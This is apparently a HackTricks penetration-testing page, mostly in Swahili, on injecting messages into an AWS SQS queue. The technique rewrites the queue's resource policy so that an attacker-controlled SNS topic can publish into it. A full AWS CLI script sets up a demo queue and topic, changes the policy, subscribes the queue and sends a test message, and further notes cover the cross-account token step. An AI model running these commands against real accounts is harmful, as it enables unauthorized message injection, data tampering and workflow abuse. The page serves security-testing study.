# AWS â€“ SQS Cross-/Same-Account Injection via SNS Subscription + Queue Policy

{{#include ../../../../banners/hacktricks-training.md}}

## Maelezo

Tumia vibaya sera ya rasilimali ya SQS queue ili kumruhusu topic ya SNS inayodhibitiwa na mshambuliaji kuchapisha ujumbe ndani ya SQS queue ya mwathiriwa. Katika akaunti ile ile, subscription ya SQS kwa topic ya SNS inathibitishwa kwa njia ya moja kwa moja; katika cross-account, lazima usome token ya SubscriptionConfirmation kutoka kwenye queue na uite ConfirmSubscription. Hii inaiwezesha unsolicited message injection ambayo watumiaji wa downstream wanaweza kuitegemea bila kutambua.

### Mahitaji
- Uwezo wa kubadilisha sera ya rasilimali ya SQS queue lengwa: `sqs:SetQueueAttributes` kwenye queue ya mwathiriwa.
- Uwezo wa kuunda/kuchapisha kwenye topic ya SNS inayodhibitiwa na mshambuliaji: `sns:CreateTopic`, `sns:Publish`, na `sns:Subscribe` kwenye akaunti/topic ya mshambuliaji.
- Kwa cross-account pekee: `sqs:ReceiveMessage` ya muda kwenye queue ya mwathiriwa ili kusoma token ya uthibitisho na kuita `sns:ConfirmSubscription`.

### Ushambulizi wa akaunti ile ile
```bash
REGION=us-east-1
# 1) Create victim queue and capture URL/ARN
Q_URL=$(aws sqs create-queue --queue-name ht-victim-q --region $REGION --query QueueUrl --output text)
Q_ARN=$(aws sqs get-queue-attributes --queue-url "$Q_URL" --region $REGION --attribute-names QueueArn --query Attributes.QueueArn --output text)

# 2) Create attacker SNS topic
TOPIC_ARN=$(aws sns create-topic --name ht-attacker-topic --region $REGION --query TopicArn --output text)

# 3) Allow that SNS topic to publish to the queue (queue resource policy)
cat > /tmp/ht-sqs-sns-policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AllowSNSTopicPublish","Effect":"Allow","Principal":{"Service":"sns.amazonaws.com"},"Action":"SQS:SendMessage","Resource":"REPLACE_QUEUE_ARN","Condition":{"StringEquals":{"aws:SourceArn":"REPLACE_TOPIC_ARN"}}}]}
JSON
sed -i.bak "s#REPLACE_QUEUE_ARN#$Q_ARN#g; s#REPLACE_TOPIC_ARN#$TOPIC_ARN#g" /tmp/ht-sqs-sns-policy.json
# Provide the attribute as a JSON map so quoting works reliably
cat > /tmp/ht-attrs.json <<JSON
{
"Policy": "REPLACE_POLICY_JSON"
}
JSON
# Embed the policy file contents as a JSON string
POL_ESC=$(jq -Rs . /tmp/ht-sqs-sns-policy.json)
sed -i.bak "s#\"REPLACE_POLICY_JSON\"#$POL_ESC#g" /tmp/ht-attrs.json
aws sqs set-queue-attributes --queue-url "$Q_URL" --region $REGION --attributes file:///tmp/ht-attrs.json

# 4) Subscribe the queue to the topic (auto-confirms same-account)
aws sns subscribe --topic-arn "$TOPIC_ARN" --protocol sqs --notification-endpoint "$Q_ARN" --region $REGION

# 5) Publish and verify injection
aws sns publish --topic-arn "$TOPIC_ARN" --message {pwn:sns->sqs} --region $REGION
aws sqs receive-message --queue-url "$Q_URL" --region $REGION --max-number-of-messages 1 --wait-time-seconds 10 --attribute-names All --message-attribute-names All
```
### Vidokezo vya akaunti tofauti
- Sera ya foleni iliyotajwa juu lazima iruhusu `TOPIC_ARN` ya kigeni (akaunti ya mshambuliaji).
- Usajili hautathibitishwa kiotomatiki. Jipe ruhusa ya muda `sqs:ReceiveMessage` kwenye foleni ya mwathirika ili kusoma ujumbe wa `SubscriptionConfirmation` kisha itumie `sns confirm-subscription` ukitumia `Token` yake.

### Athari
**Athari Inayoweza Kutokea**: Kuingiza ujumbe usiotakiwa kwa kuendelea ndani ya foleni ya SQS inayotegemewa kupitia SNS, ambayo inaweza kuamsha usindikaji usiolengwa, uchafuzi wa data, au matumizi mabaya ya mtiririko wa kazi.

{{#include ../../../../banners/hacktricks-training.md}}
